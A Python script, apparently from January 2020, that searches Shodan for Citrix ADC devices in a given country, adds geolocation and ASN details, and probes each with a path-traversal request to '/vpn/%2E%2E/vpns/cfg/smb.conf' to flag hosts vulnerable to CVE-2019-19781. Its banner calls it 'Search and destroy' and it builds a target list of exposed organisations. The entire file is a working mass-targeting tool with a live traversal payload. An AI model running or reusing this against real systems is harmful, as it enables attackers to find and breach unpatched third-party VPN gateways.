#!/usr/bin/env python3
import argparse
import sys
import shodan
import json
import urllib3
import geoip2.database
from shodan.cli.helpers import get_api_key


class Target(object):
    def __init__(self, ip, port, cn, org, location):
        self.ip = ip
        self.port = port
        self.cn = cn
        self.org = org
        self.location = location


    @property
    def country(self):
        return self.location['country_name']


    @property
    def city(self):
        return self.location['city']


    def toJSON(self):
        return


# Set colours used in script
G = '\033[92m'  # green
Y = '\033[93m'  # yellow
B = '\033[94m'  # blue
R = '\033[91m'  # red
W = '\033[0m'   # white


def no_color():
    global G, Y, B, R, W
    G = Y = B = R = W = ''


def banner():
    print("""%s
           /$$       /$$   /$$                        /$$  /$$$$$$   /$$$$$$                   
          | $$      |__/  | $$                       |__/ /$$__  $$ /$$__  $$                  
  /$$$$$$$| $$$$$$$  /$$ /$$$$$$   /$$$$$$$ /$$$$$$$  /$$| $$  \__/| $$  \__//$$$$$$   /$$$$$$ 
 /$$_____/| $$__  $$| $$|_  $$_/  /$$_____/| $$__  $$| $$| $$$$    | $$$$   /$$__  $$ /$$__  $$
|  $$$$$$ | $$  \ $$| $$  | $$   |  $$$$$$ | $$  \ $$| $$| $$_/    | $$_/  | $$$$$$$$| $$  \__/
 \____  $$| $$  | $$| $$  | $$ /$$\____  $$| $$  | $$| $$| $$      | $$    | $$_____/| $$      
 /$$$$$$$/| $$  | $$| $$  |  $$$$//$$$$$$$/| $$  | $$| $$| $$      | $$    |  $$$$$$$| $$      
|_______/ |__/  |__/|__/   \___/ |_______/ |__/  |__/|__/|__/      |__/     \_______/|__/%s
 
 Search and destroy. Or marketing maybe? Who cares.
 Find Citrix ADCs in a given country vulnerable to CVE-2019-19781 and save details to a CSV.
 written by @hadricus 01-2020%s
    """ % (R, Y, W))


def parser_error(errmsg):
    banner()
    print("Usage: python3 " + sys.argv[0] + " -a <API key>")
    print("use -h for help\n")
    print(R + "Error: " + errmsg + W)
    sys.exit()


def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -a <API key>")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-t', '--targethost', type=str, help="Host to check, will scan shodan if not specified", default=None)
    parser.add_argument('-f', '--resultsfile', type=str, help="Where to save the scanner output json file", default='output.json')
    parser.add_argument('-d', '--datafile', type=str, help="Path to save/load shodan data file (saves query credits)", default='/tmp/shodandata.json')
    parser.add_argument('-a', '--apikey', type=str, help="Your shodan.io API key", default=None)
    parser.add_argument('-c', '--country', type=str, help='Country to search', default='AU')
    parser.add_argument('-s', '--searchstring', type=str, help='Additional search arguments', default=None)
    parser.add_argument('-n', '--no-color', help='Output without color', default=False, action='store_true')
    parser.add_argument('-l', '--limit', type=int, help='Process this many hosts from shodan data', default=0)
    return parser.parse_args()


def find_devices(apikey):
    api = shodan.Shodan((apikey or get_api_key()))
    result_list = {"count": 0, "results": []}
    for result in api.search_cursor(search):
        result_list['results'].append(result)
        result_list['count'] += 1
    return result_list


def save_data(results, filename):
    with open(filename, 'w') as fp:
        json.dump(results, fp, default=lambda x: x.__dict__)


def load_data(filename):
    with open(filename, 'rb') as fp:
        return json.load(fp)


def build_targets(data, locreader, asnreader):
    # build a list of targets from shodan data
    targets = []
    for result in data:
        # whois to get more info on owner
        cn = result['ssl']['cert']['subject'].get('CN')
        target = Target(
            ip = result['ip_str'],
            port = result['port'],
            cn = cn,
            location = get_location_data(result['ip_str'], locreader, asnreader),
            org = result['ssl']['cert']['subject'].get('O') or "Unknown"
        )
        targets.append(target)
    return targets


def is_vulnerable(host, port=None):
    http = urllib3.PoolManager(cert_reqs='CERT_NONE', assert_hostname=False, num_pools=50)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 ShitSniffer/1.0'
    }
    hoststring = "{}:{}".format(host, port) if port else host
    querystring = "https://{}/vpn/%2E%2E/vpns/cfg/smb.conf".format(hoststring)
    x = http.request('HEAD', querystring, headers=headers, redirect=False, retries=False, timeout=2.5)
    return True if x.status == 200 else False


def get_location_data(host, locreader, asnreader):
    result = {}

    try:
        location = locreader.city(host)
        result["City"] = location.city.name
        result["Longitude"] = location.location.longitude
        result["Latitude"] = location.location.latitude
        result["State"] = location.subdivisions.most_specific.name
        result["Country"] = location.country.name
    except:
        result["City"] = "Unknown"
        result["Longitude"] = None
        result["Latitude"] = None
        result["State"] = "Unknown"
        result["Country"] = "Unknown"
    
    try:
        asn = asnreader.asn(host)
        result["ASN"] = asn.autonomous_system_number
        result["ASNOrg"] = asn.autonomous_system_organization
    except:
        result["ASN"] = "Unknown"
        result["ASNOrg"] = "Unknown"

    return result


if __name__ == "__main__":
    args = parse_args()
    searchdata = None
    locreader = geoip2.database.Reader('geolite/GeoLite2-City.mmdb')
    asnreader = geoip2.database.Reader('geolite/GeoLite2-ASN.mmdb')

    if args.no_color:
        no_color()
    banner()

    if args.targethost:
        print(B + "[--] Checking host {} for vulnerability...".format(args.targethost) + W)
        try:
            result = is_vulnerable(args.targethost)
            if result:
                print(Y + "[:O] Host {} is vulnerable to CVE-2019-19781".format(args.targethost) + W)
            else:
                print(G + "[:)] Host {} has been patched for CVE-2019-19781".format(args.targethost) + W)
        except Exception as e:
            print(R + "[++] Error connecting to host {}: {}".format(args.targethost, e) + W)
        raise SystemExit

    try:
        searchdata = load_data(args.datafile)
        print(B + "[--] Loaded {} results from {}...".format(searchdata['count'], args.datafile) + W)
    except FileNotFoundError:
        print(Y + "[--] Can't find {}, proceeding with fresh run".format(args.datafile) + W)

    if searchdata == None:
        try:
            # Search Shodan
            search = '"Set-Cookie: pwcount=0" country:{} has_ssl:true'.format(args.country)
            search = search if args.searchstring == None else args.searchstring + "country:{} has_ssl:true".format(args.country)
            print(B + "[--] Searching shodan.io for vulnerable devices using search string '{}', please wait...".format(search) + W)
            searchdata = find_devices(args.apikey)
            print(G + "[++] Search complete, found {} devices in {}".format(searchdata['count'], args.country))
        except shodan.APIError as e:
                print(R + "[!!] API Error: {}".format(e) + W)
                print(R + "[!!] I am dead, but I don't have to be - make me better." + W)
                raise SystemExit
        if searchdata != None:
            try:
                # Save results
                print(G + "[++] Saving search results to {}".format(args.datafile) + W)
                save_data(searchdata, args.datafile)
            except IOError as e:
                print(R + "[!!] Can't save search results to {} - {}".format(args.datafile, e) + W)
        else:
            # Nothing returned by shodan.io
            print(Y + "[??] No results returned, git gud son" + W)
            raise SystemExit
    
    print(B + "[--] Building target list..." + W)
    targets = build_targets(searchdata['results'], locreader, asnreader)
    results = []
    print(G + "[++] {} targets in my sights, checking for vulnerability...".format(len(targets)) + W)

    for i, target in enumerate(targets):
        # Make this better, use exceptions to influence console feedback
        try:
            check = is_vulnerable(target.ip)
            if check:
                print(Y + "[:O] Target {} (Org: {}, CN: {}) is vulnerable!".format(target.ip, target.org, target.cn) + W)
            target.is_vulnerable = check
            results.append(target)
        except Exception:
            print(B + "[:/] Can't reach host {}".format(target.ip) + W)

        if args.limit > 0 and i == args.limit:
            break

    if args.resultsfile:
        try:
            # Save results
            print(G + "[++] Saving target results to {}".format(args.resultsfile) + W)
            save_data(results, args.resultsfile)
        except Exception as e:
            print(R + "[!!] Can't save target results to {} - {}".format(args.resultsfile, e) + W)
    raise SystemExit